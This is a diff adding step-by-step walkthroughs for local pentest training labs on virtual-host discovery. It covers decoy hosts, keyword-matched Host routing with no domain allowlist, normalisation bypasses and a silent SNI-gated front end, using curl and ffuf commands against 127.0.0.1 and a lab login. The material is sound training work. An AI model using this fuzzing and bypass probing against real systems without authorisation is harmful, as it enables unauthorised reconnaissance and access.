+  expected: HIT chatadmin.corp.lab      (exactly one line)
+
+STEP 3 - see the traps fail
+  Catch-alls answer 200 everywhere:
+    curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: monitor.corp.lab' \
+      https://127.0.0.1:18523/app
+    expected: 200
+    curl -sk -H 'Host: monitor.corp.lab' https://127.0.0.1:18523/app | grep -c 'Chat Admin'
+    expected: 0
+    (same for status.corp.lab)
+
+  Lures claim the real host in a response header:
+    for l in vpn intranet owa citrix sso webmail remote files; do
+      curl -sk -D - -o /dev/null -H "Host: $l.corp.lab" https://127.0.0.1:18523/ \
+        | tr -d '\r' | sed -n 's/^[Xx]-[Ff]orwarded-[Hh]ost: //p'
+    done | sort -u
+    expected: chatadmin.corp.lab     (8 hosts say it, none of them is it)
+
+STEP 4 - the roots are byte-identical
+  for h in $(jq -r '.sites[].host' labs/c09-decoy-fuzz/edge/sites.json | grep -v chatadmin); do
+    curl -sk -H "Host: $h" https://127.0.0.1:18523/ | shasum -a1
+  done | sort -u | wc -l
+  expected: 1
+
+STEP 5 - the wall still holds for anything unlisted
+  curl -skI -H 'Host: not-in-scope.corp.lab' https://127.0.0.1:18523/ | grep -Ei 'HTTP/|server'
+  expected: 404 + server: Microsoft-HTTPAPI/2.0
+
+STEP 6 - regenerate and confirm determinism (optional)
+  python3 labs/c09-decoy-fuzz/gen.py
+  expected: "generated: 1 real + 39 decoys (8 lures, 2 catch-alls)"
+  Re-run verify: the tree is identical.
+
+WHY IT MATTERS
+  A vhost finding is a body/behaviour claim supported by two paths. Anything resting
+  on one 200, one header, or one length difference is the kind of thing that gets
+  closed as informational. The grade here is zero false positives, not a hit count.
+
+TEARDOWN
+  make down LAB=c09-decoy-fuzz
+
+
+==== LAB: c10-keyword-vhost ====
+
+C10 - KEYWORD-MATCHED VHOST (A WORD IN THE HOST HEADER)
+========================================================
+Lab      : c10-keyword-vhost
+Case     : C10 (your case: front-end routes on a Host substring)
+Ports    : HTTP 18170, HTTPS 18533
+Start    : make up LAB=c10-keyword-vhost
+Verify   : make verify LAB=c10-keyword-vhost      (26 assertions)
+
+OBJECTIVE
+  One application is not addressed by a hostname at all: the front end routes on a
+  substring of the Host header. portal, portalstg.app.test, app.portal.test, PORTAL,
+  portal:443 and even portal.attacker.test all land on it. DNS enumeration will never
+  show it; only whole-value Host fuzzing will.
+
+STEP 1 - whole-value Host fuzzing (not subdomain enumeration)
+  ffuf -u https://127.0.0.1:18533/ -H 'Host: FUZZ' \
+       -w _shared/data/host-keywords.txt -ac -t 40 -of json -o /tmp/c10.json
+  jq -r '.results[] | "\(.status) \(.input.FUZZ)"' /tmp/c10.json | head
+  expected: several 200s whose payload contains "portal"
+
+STEP 2 - the shape family (all one application)
+  for h in portal portalstg.app.test app.portal.test chat.portal.corp.lab PORTAL portal:443; do
+    printf '%-24s ' "$h"
+    curl -sk -o /dev/null -w '%{http_code} ' -H "Host: $h" https://127.0.0.1:18533/
+    curl -sk -H "Host: $h" https://127.0.0.1:18533/ | shasum -a1 | cut -c1-12
+  done
+  expected: every line 200 with the SAME hash (the portal landing page)
+
+  Identity header:
+  curl -skI -H 'Host: portal' https://127.0.0.1:18533/ | grep -i x-app
+  expected: x-app: portal
+
+STEP 3 - the reportable part: no domain allowlist
+  curl -sk -H 'Host: portal.attacker.test' https://127.0.0.1:18533/ | grep -o '<h1>Portal</h1>'
+  expected: <h1>Portal</h1>
+  Any domain containing the word reaches the app. If that front end is reachable,
+  an attacker who controls DNS can serve it under their own name.
+
+STEP 4 - the normalisation gaps
+  Trailing dot: a suffix rule fires before the contains rule
+    curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal.' https://127.0.0.1:18533/
+    expected: 404
+    curl -skI -H 'Host: portal.' https://127.0.0.1:18533/ | grep -i server
+    expected: server: Microsoft-HTTPAPI/2.0
+
+  Case and port are normalised
+    curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: PORTAL' https://127.0.0.1:18533/       # 200
+    curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal:443' https://127.0.0.1:18533/   # 200
+
+STEP 5 - precedence: exact hostnames beat keyword rules
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18533/chatadmin
+  expected: 200
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18533/chatadmin \
+    | grep -o 'Chat Admin'
+  expected: Chat Admin   (the SPA, not the portal)
+
+STEP 6 - bait: a keyword route that answers 403 is not a win
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: vpn.corp.lab' https://127.0.0.1:18533/
+  expected: 403
+
+STEP 7 - plain HTTP and missing Host behave the same
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal' http://127.0.0.1:18170/   # 200
+  curl -sk -o /dev/null -w '%{http_code}\n' --http1.0 -H 'Host:' https://127.0.0.1:18533/  # 404
+
+STEP 8 - discovery is not the finding: the dashboard needs a login
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal' https://127.0.0.1:18533/dashboard
+  expected: 401 or 403
+
+  TOK=$(curl -sk -H 'Host: portal' -H 'Content-Type: application/json' \
+    -d '{"email":"alex@corp.lab","password":"agent-pass-2026"}' \
+    https://127.0.0.1:18533/api/auth/login | jq -r .token)
+  curl -sk -H 'Host: portal' -H "Authorization: Bearer $TOK" \
+    https://127.0.0.1:18533/dashboard | jq .
+  expected:
+    {"portal":"dashboard","user":"alex@corp.lab","role":"agent","chats":3}
+
+STEP 9 - the reusable sweep
+  bash scripts/keyword-sweep.sh https://127.0.0.1:18533 \
+       _shared/data/host-keywords.txt corp.lab
+  expected summary line:
+    words with a repeated off-baseline fingerprint:
+      portal portal-dev portal-legacy portal-old portal2 portalnew portalprod portalstg vpn
+  Every word containing the keyword is flagged, plus the vpn 403 bait. Nothing else.
+  A hit needs two shapes agreeing - one weird status is noise.
+
+WHY IT MATTERS (and when it is reportable)
+  Front ends built on ARR ServerName rules, nginx server_name wildcards, App Service
+  default domains or Envoy :authority regexes end up routing on part of the name.
+  Consequences: the app is invisible to DNS/crt.sh/Host: name.<base> fuzzing; the
+  rule has no domain allowlist, so any attacker-controlled hostname reaches it; and
+  case/port/trailing-dot normalisation is where bypasses live. Routing alone is not
+  a finding - the dashboard requires a token, which is why this lab grades on an
+  authenticated response, not a 200.
+
+TEARDOWN
+  make down LAB=c10-keyword-vhost
+
+
+==== LAB: c11-silent-sni ====
+
+C11 - SILENT FRONT END: NO SNI OR NO HOST, NO ANSWER
+=====================================================
+Lab      : c11-silent-sni
+Case     : C11 (your case: routing that drops instead of answering)
+Ports    : HTTP 18190, HTTPS 18553
+Start    : make up LAB=c11-silent-sni
+Verify   : make verify LAB=c11-silent-sni      (20 assertions)
+
+OBJECTIVE
+  A front end that answers nothing unless the TLS handshake carries the right SNI
+  AND the request carries the right Host. Bare IP, wrong SNI, wrong Host: the socket
+  stays open and no byte comes back. Learn to tell silence from 404/403/reset, and
+  learn why silence is the hardest evidence to work with.
+
+WHAT YOU GET
+  - https://127.0.0.1:18553 and http://127.0.0.1:18190 - nothing answers there.
+  - The site is ops.corp.lab (an "Ops Console"). You have to know the name before
+    the front end says anything at all.
+
+RULES OF THE LAB
+  - require_sni: no SNI or an unexpected SNI stalls the handshake (no ServerHello).
+  - require_host: the Host is compared literally (case and port normalised, trailing
+    dot NOT normalised). A mismatch is dropped after the handshake, with no status.
+  - The front end holds the connection ~10-20s and never writes a byte, so your
+    client's own timeout is what you observe.
+
+SUCCESS CRITERION
+  bash checks/verify.sh. As a human: you can state which of your tools would have
+  reported "nothing here" and why that is not evidence of absence.
+
+HINTS
+  1. curl exit code 28 = timeout; 000 as the status alone proves nothing (a reset
+     looks similar). Assert on the exit code.
+  2. No SNI means no certificate: openssl s_client without -servername gets nothing.
+     That is why passive certificate discovery fails against this front end.
+  3. On :80 there is no SNI - only Host. Try the name there to confirm it exists
+     before blaming TLS.
+  4. The allow-list is literal: ops.corp.lab:443 matches, ops.corp.lab. does not.
